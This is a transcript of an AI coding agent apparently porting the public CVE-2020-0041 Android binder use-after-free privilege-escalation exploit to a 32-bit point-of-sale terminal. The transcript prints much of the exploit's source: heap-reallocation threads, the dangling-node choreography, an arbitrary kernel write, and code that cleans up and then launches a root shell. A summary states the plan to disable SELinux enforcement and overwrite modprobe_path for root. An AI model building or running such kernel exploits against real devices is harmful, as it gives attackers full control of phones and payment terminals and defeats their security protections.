[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220 && ls tmp/m3/ | head -40; echo ===; ls tmp/m3/bfs_ref/lpe/src/ tmp/m3/bfs_ref/lpe/include/ 2>/dev/null; echo ===; ls work 2>/dev/null; ls /home/enryu/Desktop/Temp/OneProMag/work/ 2>/dev/null | head"}

[tool • bash]
abi2.bin
abi2.o
abi2.S
abi2_words.txt
_abs.txt
allow_isolated_scan.py
arm2.sh
arm_corepipe.sh
_ashm.bin
ashmemd_aidl.so
ashmemd_bin
attr_domain.txt
b2w_t0_l0_b0_p0.txt
b2w_t0_l0_b0_p1.txt
b2w_t0_l0_b1_p0.txt
b2w_t0_l0_b1_p1.txt
b2w_t0_l1_b0_p0.txt
b2w_t0_l1_b0_p1.txt
b2w_t0_l1_b1_p0.txt
b2w_t0_l1_b1_p1.txt
b2w_t1_l0_b0_p0.txt
b2w_t1_l0_b0_p1.txt
b2w_t1_l0_b1_p0.txt
b2w_t1_l0_b1_p1.txt
b2w_t1_l1_b0_p0.txt
b2w_t1_l1_b0_p1.txt
b2w_t1_l1_b1_p0.txt
b2w_t1_l1_b1_p1.txt
b.bin
bf2.bin
bf2.o
bf2.S
bf.bin
bf.o
bf.S
bfs_ref
_bgo.bin
bgo.bin
bgo.va
binder_gate.py
===
tmp/m3/bfs_ref/lpe/include/:
binder.h
binder_lookup.h
endpoint.h
exploit.h
handle.h
helpers.h
log.h
node.h
pending_node.h
realloc.h
uapi_binder.h

tmp/m3/bfs_ref/lpe/src/:
binder.c
binder_lookup.c
endpoint.c
exploit.c
helpers.c
log.c
node.c
pending_node.c
realloc.c
===
b63_full.md
b65_full.md
b69_full.md
b88_full.md


[assistant • compress]
{"content":"m03759–m05095 CVE-2020-0423 stage-1/2 CLOSED (honest-negative, full detail already in b88–b97 + findings/E-057_section_3-1_cve-2020-0423.md FINAL with addendum):\n- Goal (user m03759): \"find on website kernel R/W on 4.14.133 then attempt them\" — NEWPOS 9220, serial 83768010426653, root via `basu 0`, kernel 4.14.133 armv7, KASLR off, PREEMPT=y.\n- Stage-1: 8171 benign \"unexpected work type, 4\" plateau (does not scale with iters → choreography artifact, NOT race wins). METHOD-CRITICAL BUG documented: BC_TRANSACTION must be at MEM+0x200 with btd@0x204 (LTS layout); earlier t42–t49 runs all zero-hit because cmd@0x1FC + write_buffer@0x200 → kernel read 0 as cmd, -22, NO node ever created.\n- Stage-2 lever-2: WEAK_BINDER choreography (poc_lts6.c/poc_lts7.c in tmp/m3/) → SM per-iteration node free PROVEN (debug_mask=4096 → \"binder: refless node N deleted\", 1320–1452/run). NO UAF type read observed at ~10^9-iteration scale; dequeue→type-read window not winnable without KASAN. F-014 unfiled. E-057 §3.1 md contains ledger + addendum + remaining levers.\n- Ledger truth (vanilla414b.c): BINDERS obj → SM ref strong=1 weak=1, buffer_release only strong-decs → node survives; WEAK_BINDER obj → ref strong=0 weak=1 → weak dec at release → cleanup_ref → free branch → dequeue_work+rb_erase+kfree.\n- User asked (m05096) whether PZ post https://projectzero.google/2023/09/analyzing-modern-in-wild-android-exploit.html was used → answered (m05101): stabilization pattern (ashmem_misc.fops hijack + configfs fops type-confusion + ASHMEM_SET_NAME private_data shaping + init_uts_ns fake fops oracle) already incorporated in E-056/b55 Part III; CVE-2023-0266 itself dead here (CONFIG_COMPAT=n, armv7 native path locks correctly); Mali JIT spray/tlstream unusable (32-bit Unisoc kbase unverified; KASLR off).\n- User approved (m05102 \"yes\"): pivot to CVE-2020-0041 arm32 port with that stabilization stack.\nOpen objectives: (m05102, user-approved) CVE-2020-0041 arm32 port → W-gadget → selinux_enforcing=0 → modprobe_path → root (F-014); see b98 for full design state."}

[tool • compress]
[Compressed m03759–m05095 → 1 block(s), ~70802 tokens saved.]
 · b99 full summary 1895ch [2026-11-15 10:30:39 – 2026-11-15 14:28:15] · head "- Goal (user m03759): "find on" … tail "port → W-gadget → selinux_enforcing=0 → modprobe_path → root (F-014); see b98 for full design state."
Fingerprints show head/tail only — every summary is stored in full. To retrieve a specific detail from a new block, call search_context({ query }) first; decompress only if the excerpt doesn't answer it.

No compressible ranges remain — the context is already at its minimum; continue the task without compressing.

[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && ls | grep -iE '^t3|414|binder' | head; echo ===; find . -maxdepth 2 -name '*414*' -o -maxdepth 2 -name 'kern*' | head; echo ===; wc -l bfs_ref/lpe/src/*.c bfs_ref/lpe/include/*.h"}

[tool • bash]
binder_gate.py
binderprobe.bin
binderprobe.o
binderprobe.S
binder_probe_words.txt
binder_state3.txt
binder_state5.txt
binder_state_now2.txt
binder_state_now.txt
binder_variants.py
===
./kern_ref
./kern_ref/414_eventpoll.c
./kern_ref/vanilla414b.c
./kern_ref/aosp414.c
./kern_ref/414_binder.h
./kern_ref/414_binder_alloc.c
./kern_ref/414_binder.c
./kern_ref/vanilla_414_binder.c
./kernel_gz2.bin
./kernel_img.bin
===
  1224 bfs_ref/lpe/src/binder.c
   482 bfs_ref/lpe/src/binder_lookup.c
   343 bfs_ref/lpe/src/endpoint.c
   796 bfs_ref/lpe/src/exploit.c
    30 bfs_ref/lpe/src/helpers.c
    38 bfs_ref/lpe/src/log.c
   540 bfs_ref/lpe/src/node.c
   400 bfs_ref/lpe/src/pending_node.c
   253 bfs_ref/lpe/src/realloc.c
   119 bfs_ref/lpe/include/binder.h
    11 bfs_ref/lpe/include/binder_lookup.h
    37 bfs_ref/lpe/include/endpoint.h
     8 bfs_ref/lpe/include/exploit.h
    10 bfs_ref/lpe/include/handle.h
     6 bfs_ref/lpe/include/helpers.h
    10 bfs_ref/lpe/include/log.h
    48 bfs_ref/lpe/include/node.h
    34 bfs_ref/lpe/include/pending_node.h
    14 bfs_ref/lpe/include/realloc.h
   514 bfs_ref/lpe/include/uapi_binder.h
  4917 total


[assistant]
<acp tokens="45" type="text" time="2026-11-15 14:30:02">m05127</acp>
No `t37.c` yet — port starts fresh from the BFS reference tree. Reading the E-057 design doc first (it's the ground truth for layout/choreography), then the BFS reference sources.

[assistant]
<acp tokens="34" type="text" time="2026-11-15 14:30:08">m05132</acp>
E-057 design is complete and verified. Now reading the BFS reference sources in full to port. Starting with the core choreography files:

[assistant • read]
{"path":"/home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/bfs_ref/lpe/src/exploit.c"}

[tool • read]
#include <stdio.h>
#include <stdint.h>
#include <pthread.h>
#include <fcntl.h>
#include <errno.h>
#include <stdbool.h>
#include <poll.h>
#include <sys/epoll.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <unistd.h>
#include <sys/mman.h>
#include <linux/ashmem.h>
#include <linux/fs.h>

#include "node.h"
#include "exploit.h"
#include "handle.h"
#include "binder.h"
#include "log.h"
#include "endpoint.h"
#include "pending_node.h"

#define BINDER_BUFFER_SZ	128 * 1024
#define RESERVED_BUFFER_SZ	127 * 1024

#define KERNEL_MAGIC    (unsigned long)0x644d5241

#define SELINUX_ENFORCING_OFFSET 0x2ba4000
#define MEMSTART_ADDR_OFFSET 0x20d1090
#define SYSCTL_TABLE_ROOT_OFFSET 0x29da3f8
#define PROC_DOUINTVEC_OFFSET 0x196775c
#define INIT_TASK_OFFSET 0x29a1e80L
#define INIT_CRED_OFFSET 0x29b00a0
#define OFFSET_PIPE_FOP 0x1f2f650

#define TASKS_OFFSET 0x570
#define PID_OFFSET 0x670
#define MM_OFFSET 0x5c0
#define REAL_CRED_OFFSET 0x838

char pathname[64];


uint64_t reserved_buffer_sz = 0;
uint64_t memstart_addr = 0;
uint64_t kernel_base = 0;

/*
 * Convert physical address to kernel virtual address.
 */

uint64_t phys_to_virt(uint64_t phys)
{
   return (phys - memstart_addr) | 0xFFFFFFC000000000;
}

/*
 * Trigger the bug, and free pending node, on which we still have
 * a reference. This will be the primitive for all the exploitation.
 */
void dec_node(struct binder_state *bs, uint64_t target, uint64_t vma_start, bool strong, bool second)
{

   struct binder_transaction_data_sg sg;
   struct binder_transaction_data *td;
   struct binder_write_read bwr;

   uint64_t handle = 0; /* It *SHOULD* be 0 as it's the value from ref created from the ctx mgr node. */

   /* Send a big buffer. */

   uint32_t tr_size = reserved_buffer_sz; // Use a query size of 0x20000 (we subtract 0x10 for the secctx)
   uint8_t data[BINDER_BUFFER_SZ];
   uint64_t offsets[128];
   uint8_t sg_buf[0x1000];
   uint32_t readbuf[32];
   uint8_t *ptr = data;
   uint64_t *offs = offsets;
   uint8_t b

...[truncated for context space] — original ~7270 tokens]...

ifferent nodes. */
      uint64_t task = get_task_by_pid(init_task, nodes[j]->tid);
      if (!task) {
         printf("[!] Couldn't find task for pid %d\n", nodes[j]->tid);
         continue;
      }
      uint64_t kstack = read64(task + 0x28);
      
      for (int i = 0; i < 0x4000; i += 8) {
         if (read64(kstack + i) == nodes[j]->kaddr) {
            /* We overwrite with 0x10, as `kfree()` will not complain when encountering it,
             * contrary to the NULL ptr.
             */
            log_info("[*] Replaced sendmmsg dangling reference\n");
            write64(kstack + i, 0x10);
         }
      }

      kill(nodes[j]->tid, SIGKILL);
      waitpid(nodes[j]->tid, NULL, 0);
   }

   log_info("[+] Cleaned up sendmsg threads\n");

   /* Bump up f_count to avoid entering into pipe_release() when exiting the process. */
   write64(file_addr + 0x38, 0xff);

   /* Clear up our fake node */
   write64(prev_node + 16, 0);

   /* We also smashed our epitem, try and restore that ... */
   printf("[*] epitem.next = %lx\n", read64(file->kaddr + 88));
   printf("[*] epitem.prev = %lx\n", read64(file->kaddr + 88 + 8));

   // Just set next = prev, since we should be the only epitem here
   write64(file->kaddr + 88, read64(file->kaddr + 88 + 8));

   /* Free all those pending nodes and threads */
   node_free(file);
   node_free(epitem_node);
   node_free(write8_selinux);
   node_free(write8_inode);
   node_free(write8_sysctl);
   cleanup_realloc_threads();



   /* We can finally enjoy our root shell. */
   log_info("[*] Launching privileged shell\n");
   char *args[] = {"/system/bin/sh", NULL};
   char *envp[] = {"PATH=/sbin:/system/sbin:/product/bin:/apex/com.android.runtime/bin:/system/bin:/system/xbin:/odm/bin:/vendor/bin:/vendor/xbin", "ANDROID_DATA=/data", "HOSTNAME=root_by_cve-2020-0041", NULL};
   execve(args[0], args, envp);
   return 0;

out:
   printf("[!] Sleeping forever since it's not safe to exit now...\n");
   while(1) sleep(10);
   return -1;
}

[assistant]
<acp tokens="36" type="text" time="2026-11-15 14:30:11">m05135</acp>
Read the exploit.c — I have the trigger choreography. Now reading the supporting modules (node, pending_node, realloc, endpoint, binder core):

[assistant • read]
{"path":"/home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/bfs_ref/lpe/include/node.h"}

[assistant • read]
{"path":"/home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/bfs_ref/lpe/src/pending_node.c"}

[assistant • read]
{"path":"/home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/bfs_ref/lpe/src/realloc.c"}

[tool • read]
#ifndef NODE_H_
#define NODE_H_
#include <stdint.h>
#include <stdbool.h>

#include "binder.h"
#include "pending_node.h"

struct exp_node {
	struct binder_state *bs;
	uint64_t handle;
	const char *endpoint_name;
   uint8_t name[16];
	uint64_t vma_start;
	bool second;
	pthread_t *th;
	int idx;
   int max;
   struct pending_node *pending_nodes;
   int num_pending;
	uint64_t addr;
   uint64_t kaddr;
	int target_fd;
	uint64_t file_addr;
	int ep_fd;
	pid_t tid;
};

/* exp_node API. */

struct exp_node *node_new(const char *name);
void node_free(struct exp_node *node);
bool node_reset(struct exp_node *node);

/* This are the kernel related operations. */
void node_kfree(struct exp_node *node);
bool node_realloc_content(struct exp_node *node, void *data, size_t size);
bool node_write8(struct exp_node *node, uint64_t what, uint64_t where);
bool node_write_null(struct exp_node *node, uint64_t where);


bool node_realloc(struct exp_node *node, void *content, size_t size);
struct exp_node *node_create(uint8_t *endpoint_name, int target_fd);
static struct exp_node *_node_create(uint8_t *endpoint_name, int target_fd);
void node_destroy(struct exp_node *node);
bool node_leak(struct exp_node *node, uint64_t *A, uint64_t *B);
bool node_leak_addr_and_kbase(struct exp_node *node, uint64_t *text);
#endif /*! NODE_H_ */


[tool • read]
#include <stdio.h>
#include <stdint.h>
#include <pthread.h>
#include <errno.h>
#include <poll.h>
#include <sys/syscall.h>

#include "log.h"
#include "binder.h"
#include "endpoint.h"
#include "pending_node.h"

static struct pending_node *pending_nodes = NULL;
static uint64_t last_node_th = 0;

static struct pending_node *pending_node_new(void)
{
	struct pending_node *node = NULL;

	node = malloc(sizeof(*node));
	if (!node) {
		log_err("malloc: %s\n", strerror(errno));
		return NULL;
	}

	memset(node, 0, sizeof(*node));

	if (pthread_barrier_init(&node->barrier, NULL, 2)) {
		log_err("pthread_barrier_init: %s\n", strerror(errno));
		free(node);
		return NULL;
	}

	if (pthread_barrier_init(&node->ready, NULL, 2)) {
		log_err("pthread_barrier_init: %s\n", strerror(errno));
		free(node);
		return NULL;
	}

	if (pthread_barrier_init(&node->do_barrier, NULL, 2)) {
		log_err("pthread_barrier_init: %s\n", strerror(errno));
		free(node);
		return NULL;
	}

	if (pthread_barrier_init(&node->done_barrier, NULL, 2)) {
		log_err("pthread_barrier_init: %s\n", strerror(errno));
		free(node);
		return NULL;
	}


	/* Insert in front. */
	node->next = pending_nodes;
	pending_nodes = node;

	return node;
}

static struct pending_node *pending_node_get(pthread_t node_th)
{
	struct pending_node *tmp = pending_nodes;

	while (tmp) {
		if (tmp->uaf_node_th == node_th)
			return tmp;
		tmp = tmp->next;
	}

	return NULL;
}

/*
 * This thread keep a reference to the freed binder_node, which allows leaking a qword at offset 0x58
 * and 0x60 of an object in the kmalloc-128 slab, as well a trigerring a controlled write8
 */
void *pending_node_thread(void *args)
{
	struct pending_node *node = (struct pending_node *)args;
	uint32_t remaining = 0, consumed = 0;
	uint32_t looper = BC_ENTER_LOOPER;
	struct binder_io msg, reply;
	struct binder_state *from = node->bs;
	uint64_t handle = node->uaf_node;
	uint8_t msg_data[0x1000], reply_data[0x1000];
	uint64_t res = -1;
	int signo;
	sigset_t set;
   uint6

...[truncated for context space] — original ~2524 tokens]...

	 */
	int i;
	for (i = 0; i < strong; i++)
		dec_node(bs, node, vma_start, true, second);

	for (i = 0; i < weak; i++)
		dec_node(bs, node, vma_start, false, second);
}

/*
 * Trigger a write8, by having the pending node thread
 * calling BC_FREE_BUFFER, which will enter the
 * `binder_dec_node()` function with (hopefully) controlled
 * `binder_node`, ultimately leading to a controlled
 * write8
 */
void pending_node_write8(pthread_t th)
{
	struct pending_node *node = pending_node_get(th);
	if (!node)
		return ;
	/* Buffer release. */

   pthread_barrier_wait(&node->ready);
   pthread_barrier_wait(&node->do_barrier);
   pthread_barrier_wait(&node->done_barrier);
   pthread_join(th, NULL);
	
   struct pending_node *tmp = pending_nodes;
	if (tmp == node) {
		pending_nodes = node->next;

	} else {
		while (tmp->next != node)
			tmp = tmp->next;

		tmp->next = node->next;
	}

	free(node);
}

/*
 * Kindly ask the endpoint to terminate a specific pending node thread.
 */
void pending_node_terminate(struct binder_state *bs, uint64_t handle, pthread_t th)
{
	uint8_t txn_data[0x100];
	uint8_t reply_data[0x100];
	struct binder_io msg, reply;


	bio_init(&msg, txn_data, sizeof(txn_data), 10);
	bio_init(&reply, reply_data, sizeof(reply_data), 10);

	bio_put_uint32(&msg, (uint32_t)th);
	bio_put_uint32(&msg, (uint32_t)((uint64_t)(th)>>32));
	binder_call(bs, &msg, &reply, handle, TERMINATE_PENDING_NODE);

	binder_free_buffer(bs, reply.data0);
}

/*
 * Leak the 2 qword of data from the UAFed pending node.
 * It has the side effect or terminating the pending_node_thread
 */
void pending_node_leak(pthread_t th, uint64_t *q1, uint64_t *q2)
{
	struct pending_node *node = pending_node_get(th);
	if (!node)
		return;
	/* Okay spray epoll structures. */
   pthread_barrier_wait(&node->ready);
   pthread_barrier_wait(&node->do_barrier);
   pthread_barrier_wait(&node->done_barrier);
	/* Inspecting node value. */

	if (q1)
		*q1 = node->leaked_data[0];
	if (q2)
		*q2 = node->leaked_data[1];
}


[tool • read]
#define _GNU_SOURCE
#include <sched.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <stdint.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>

#include "realloc.h"
#include "log.h"
#include "helpers.h"

struct realloc_thread {
   void *stack;
   pid_t pid;
   pthread_t th;
   bool evicted;
   size_t size;
   int cpu;
   int pair[2];
   int ctrl[2];
   pthread_barrier_t barrier;
};

uint8_t realloc_buffer[BUFSZ];

volatile struct realloc_thread threads[NREALLOC];


pthread_barrier_t realloc_barrier;

/*
 * This thread is in charge of reallocating the freed binder_node
 * with controlled data.
 */
void *realloc_thread(void *args)
{

   uint8_t buffer[BUFSZ + 1];
   struct realloc_thread *thread = (struct realloc_thread *)args;
   size_t size = thread->size;
   int cpu = thread->cpu;
	struct msghdr msg;
	struct iovec iov;
	memset(&iov, 0, sizeof(iov));
	memset(&msg, 0, sizeof(msg));

	pin_cpu(cpu);

	uint32_t pid = syscall(__NR_gettid);
	/* Exhaust the available socket window. */
	iov.iov_base = realloc_buffer;
	iov.iov_len = size;
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;

	while (sendmsg(thread->pair[0], &msg, MSG_DONTWAIT) > 0);

	/* The next call will block. */
	msg.msg_control = realloc_buffer;
	msg.msg_controllen = size;

   /* Signal we have finished spawning. */

   thread->evicted = false;
   while (!thread->evicted) {

      //pthread_barrier_wait(&realloc_barrier);
      /* We're waiting here for the signal to copy the buffer data. */
      pthread_barrier_wait(&thread->barrier);


      memcpy(buffer, realloc_buffer, size);
      *(uint64_t *)(buffer + 0x60) =  pid;
      msg.msg_control = buffer;
      msg.msg_controllen = size;

      //pthread_barrier_wait(&realloc_barrier);
      /* We're waiting for the signal to block on the sendmsg syscall, and kmalloc() our
       * controlled data.
       */
      pthread_barrier_wait(

...[truncated for context space] — original ~1509 tokens]...

 BUFSZ;

   /* We need to skip the first 8 bytes, because otherwise, sendmsg will fail. */
   memcpy(realloc_buffer + 8, content + 8, size - 8);
	/* Unlock the realloc thread, let them copy the buffer. */
   realloc_barrier_wait();
}

/*
 * Discard a thread from the pool. We do this when we successfully replaced a `binder_node` with controlled
 * content, and this `binder_node` is subsequently used to trigger a write8, as the side effect of this is
 * to free (once again) the `binder_node`. As the realoc thread will keep a reference to the `binder_node` and
 * free it as well, we keep it blocking on `sendmsg()` for now, until we can clean that reference from the kernel
 * stack later on.
 */
bool discard_realloc_thread(pid_t pid)
{
   int i;

   for (i = 0; i < NREALLOC; i++) {
      if (threads[i].pid == pid) {
         threads[i].evicted = true;
         return true;
      }
   }

   return false;
}

/*
 * Make the threads exit their blocking `sendmsg()` call, and brace themselves before
 * being use once again to allocate controlled data in kernel land.
 */
void reset_realloc_threads()
{
   int i;
   uint8_t buf[0x1000];

   for (i = 0; i < NREALLOC; i++) {
      if (threads[i].evicted)
         continue;
      while (recv(threads[i].pair[1], buf, 0x1000, MSG_DONTWAIT) > 0);
      pthread_barrier_wait(&threads[i].barrier);
   }
}

/*
 * We're done, kill the whole thread pool.
 */
void cleanup_realloc_threads()
{
	int i;
	/* Kill realloc threads. */
	for (i = 0; i < NREALLOC; i++) {
		int status;
      if (threads[i].evicted){
			continue;
      }
      kill(threads[i].pid, SIGKILL);
      close(threads[i].pair[0]);
      close(threads[i].pair[1]);

      //pthread_barrier_wait(&threads[i].barrier);  
	}
	int status;
	for (i = 0; i < NREALLOC; i++) {
      if (threads[i].evicted)
			continue;
		waitpid(threads[i].pid, &status, 0);
      //pthread_join(threads[i].th, NULL);
      threads[i].pid = 0;
      free(threads[i].stack);
      threads[i].stack = 0;
	}
}





[assistant • read]
{"path":"/home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/bfs_ref/lpe/src/node.c"}

[tool • read]
#include <errno.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/epoll.h>

#include "binder.h"
#include "binder_lookup.h"
#include "log.h"
#include "exploit.h"
#include "endpoint.h"
#include "node.h"

/*
 * Create a vulnerable dangling node within the binder transaction.
 */
static struct exp_node *_node_new(struct exp_node *node, const char *name)
{
	struct binder_state *bs = NULL;
	pthread_t *uaf_node_th = NULL;
	//uint32_t num_pending = 0x40;
	uint32_t num_pending = 0x40;
   uint64_t vma_start = 0;
	uint64_t handle = 0;

   if (!node || !name)
      return NULL;

	bs = binder_open(BINDER_DEVICE, 128 * 1024);
	if (!bs) {
		return NULL;
	}

	handle = grab_handle(bs, name);
	if (!handle)
		return NULL;

	/* Prepare the pending nodes array. */
	uaf_node_th = calloc(num_pending + 1, sizeof(pthread_t));
   if (!uaf_node_th) {
      log_err("[-] Unable to allocate new pending node thread array. Reason: '%s'\n", strerror(errno));
      goto err;
   }

	vma_start = setup_pending_nodes(bs, handle, uaf_node_th, num_pending, 0);
   if (!vma_start) {
      log_err("[-] Bug trigger failed.\n");
      goto err;
   }

   /* Initialize exp_node. */
   node->bs = bs;
   node->vma_start = vma_start;
   memset(node->name, 0, sizeof(node->name));
   strncpy(node->name, name, sizeof(node->name) - 1);
   node->handle = handle;
   node->th = uaf_node_th;
   node->idx = 0;
   node->num_pending = num_pending;
   node->max = num_pending;
   node->second = false;
   node->target_fd = -1;
   node->ep_fd = -1;

   return node;

err:
   if (uaf_node_th)
      free(uaf_node_th);

   return NULL;
}

/*
 * Create a new `exp_node`.
 */
struct exp_node *node_new(const char *name)
{
   struct exp_node *node = NULL;

   node = calloc(1, sizeof(*node));
   if (!node) {
      log_err("[-] Unable to allocate new node. Reason: '%s'\n", strerror(errno));
      return NULL;
   }

   /* Need to bootstrap the associated e

...[truncated for context space] — original ~3276 tokens]...

replacement */
   *(uint64_t *)(data + 0x68) = 0; /* has_strong_refs == 0 &&  has_weak_refs == 0 */

   /* Create dummy node. */
   dummy = node_new("dummy");
   pipe(pfd);

   /* Overlay an epitem. */
   while (!node_realloc_epitem(dummy, pfd[0]))
         node_reset(dummy);


   /* Do we know the node kaddr yet? */
   if (!node->kaddr) {
      /* Drop the current epitem. */
      node_free_epitem(node);


      /* Use the previous'dummy' node to disclose both
       * dummy and node kaddr.
       */
      node_kaddr_disclose(dummy, node);
   }

   /* update the kaddr values to bypass safe unlinking. */
   *(uint64_t *)(data + 0x8) = node->kaddr + 0x8;
   *(uint64_t *)(data + 0x10) = node->kaddr + 0x8;

   log_info("[*] Reallocating content of '%s' with controlled data.", node->name);
   while (!node_realloc_content(node, data, 0x80)) {
      log_info(".");
      node_reset(node);
      while (!node_kaddr_disclose(dummy, node)) {
         node_reset(node);
      }

      /* Update values. */
      *(uint64_t *)(data + 0x8) = node->kaddr + 0x8;
      *(uint64_t *)(data + 0x10) = node->kaddr + 0x8;
   }

   if (dummy) {
      node_free(dummy);
      close(pfd[0]);
      close(pfd[1]);
   }
   log_info("[DONE]\n");

   /* Perform the actual write8, all the code before was for setup... */
   log_info("[+] Overwriting 0x%llx with 0x%llx...", where, what);
   pending_node_write8(node->th[node->idx - 1]);
   log_info("[DONE]\n");

   return true;
}


/*
 * Trigger a write8 primitive and overwrite an arbitrary location with a NULL value.
 * Assumes the binder node associated with `node` has just been freed, and its kernel
 * address has been previously disclosed.
 */
bool node_write_null(struct exp_node *node, uint64_t where)
{
   return node_write8(node, 0, where);
}


bool node_leak(struct exp_node *node, uint64_t *A, uint64_t *B)
{
   if (!node || node->idx == node->num_pending)
      return false;

   pending_node_leak(node->th[node->idx++], A, B);

   return true;
}



[assistant • read]
{"path":"/home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/bfs_ref/lpe/src/binder.c"}

[tool • read]
/* Copyright 2008 The Android Open Source Project
 */

#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#include "log.h"
#include "binder.h"
#include "uapi_binder.h"

#define MAX_BIO_SIZE (1 << 30)

#define TRACE 0

void bio_init_from_txn(struct binder_io *io, struct binder_transaction_data *txn);

#if TRACE
void hexdump(void *_data, size_t len)
{
    unsigned char *data = _data;
    size_t count;

    for (count = 0; count < len; count++) {
        if ((count & 15) == 0)
            flog_info(stderr,"%04zu:", count);
        flog_info(stderr,"\\x%02x", *data);
        // flog_info(stderr," %02x %c", *data,
                // (*data < 32) || (*data > 126) ? '.' : *data);
        data++;
        if ((count & 15) == 15)
            flog_info(stderr,"\n");
    }
    if ((count & 15) != 0)
        flog_info(stderr,"\n");
}

void binder_dump_txn(struct binder_transaction_data *txn)
{
    struct flat_binder_object *obj;
    binder_size_t *offs = (binder_size_t *)(uintptr_t)txn->data.ptr.offsets;
    size_t count = txn->offsets_size / sizeof(binder_size_t);

    flog_info(stderr,"  target %016"PRIx64"  cookie %016"PRIx64"  code %08x  flags %08x\n",
            (uint64_t)txn->target.ptr, (uint64_t)txn->cookie, txn->code, txn->flags);
    flog_info(stderr,"  pid %8d  uid %8d  data %"PRIu64"  offs %"PRIu64"\n",
            txn->sender_pid, txn->sender_euid, (uint64_t)txn->data_size, (uint64_t)txn->offsets_size);
    hexdump((void *)(uintptr_t)txn->data.ptr.buffer, txn->data_size);
    while (count--) {
        obj = (struct flat_binder_object *) (((char*)(uintptr_t)txn->data.ptr.buffer) + *offs++);
        flog_info(stderr,"  - type %08x  flags %08x  ptr %016"PRIx64"  cookie %016"PRIx64"\n",
                obj->hdr.type, obj->flags, (uint64_t)obj->binder, (uint64_t)obj->cookie);
    }
}

#define NAME(n) case n: return #n
const char *cmd_name(u

...[truncated for context space] — original ~7909 tokens]...


			res = 0;
			break;

		case BR_RELEASE:
		case BR_DECREFS:
		case BR_ACQUIRE:
		case BR_INCREFS:
			res =2 * sizeof(uint64_t);
			*consumed += res;
			*remaining -= res;
			break;
		case BR_REPLY:
		case BR_TRANSACTION:
			res = sizeof(struct binder_transaction_data);
			*consumed += res;
			*remaining -= res;
			break;
		case BR_FAILED_REPLY:
		case BR_TRANSACTION_COMPLETE:
			res = 0;
			break;
		default:
			log_err("Unhandle command %s\n", cmd_name(cmd));
			exit(1);
			return (uint32_t)-1;

	}

	/* Update ptr and size */
	return cmd;
}

uint32_t binder_read_next_dbg(struct binder_state *bs, void *data, uint32_t *remaining, uint32_t *consumed)
{
	int res;
	uint32_t cmd;
	void *ptr, *end;

	log_info("remaining: %x\nconsumed: %x\n", *remaining, *consumed);

	if (!*remaining) {
		/* Read the first 8 bytes. */
//		log_info("before read\n");
		res = binder_read(bs->fd, data, 32 * sizeof(uint32_t));
//		log_info("after read: %x\n", res);
		if (res < 0) {
			log_err("binder_read_next: %s\n", strerror(errno));
			return (uint32_t)-1;
		}

		*remaining = res;
		*consumed = 0;
	}


	ptr = data;
	ptr += *consumed;
	end = ptr + *remaining;

	cmd = *(uint32_t *)ptr;

	*consumed += sizeof(uint32_t);
	*remaining -= sizeof(uint32_t);
	ptr += sizeof(uint32_t);

	log_info("cmd: %s\n", cmd_name(cmd));
	switch (cmd) {
		case BR_NOOP:
			res = 0;
			break;

		case BR_RELEASE:
		case BR_DECREFS:
		case BR_ACQUIRE:
		case BR_INCREFS:
			log_info("ptr: 0x%llx\n", *(uint64_t *)(ptr));
			log_info("cookie: 0x%llx\n", *(uint64_t *)(ptr + 0x8));
			res =2 * sizeof(uint64_t);
			*consumed += res;
			*remaining -= res;
			break;
		case BR_REPLY:
		case BR_TRANSACTION:
			res = sizeof(struct binder_transaction_data);
			*consumed += res;
			*remaining -= res;
			break;
		case BR_FAILED_REPLY:
		case BR_TRANSACTION_COMPLETE:
			res = 0;
			break;
		default:
			log_err("Unhandle command %s\n", cmd_name(cmd));
			exit(1);
			return (uint32_t)-1;

	}

	/* Update ptr and size */
	return cmd;
}



[assistant • read]
{"path":"/home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/bfs_ref/lpe/src/endpoint.c"}

[assistant • read]
{"path":"/home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/bfs_ref/lpe/include/endpoint.h"}

[tool • read]
#include <sched.h>
#include <stdio.h>
#include <pthread.h>
#include <stdint.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <poll.h>
#include <sys/epoll.h>
#include <errno.h>
#include <setjmp.h>

#include "binder.h"
#include "handle.h"
#include "log.h"
#include "endpoint.h"
#include "pending_node.h"


static struct endpoint_handle *endpoints = NULL;

static int endpoint_transaction_handler(struct endpoint_handle *handle, struct binder_transaction_data *tr, struct binder_io *msg, struct binder_io *reply)
{

	int res = 1;
	struct binder_state *bs = handle->bs;
	pthread_t th;

	switch (tr->code) {
		case GET_VMA_START:
			/* Do it in 2 times. */
			bio_put_uint32(reply, (uint32_t)bs->mapped);
			bio_put_uint32(reply, (uint32_t)(((uint64_t)(bs->mapped)>>32)));
			res = 0;
			break;
		case EXCHANGE_HANDLES:
			handle->client_handle = bio_get_ref(msg);
			/* Acquire the handle. */
			binder_acquire(bs, handle->client_handle);

			/* Create the vulnerable node in the process. */
			bio_put_obj(reply, bs->mapped + 0xe8);
			uint64_t node2 = bs->mapped + 0xe8;
			node2 = node2 & 0xFFFFFFFF;
			node2 = node2 << 32;
			node2 += 0x42;

			bio_put_obj(reply, node2);
			res = 0;
			break;
		case ADD_PENDING_NODE:
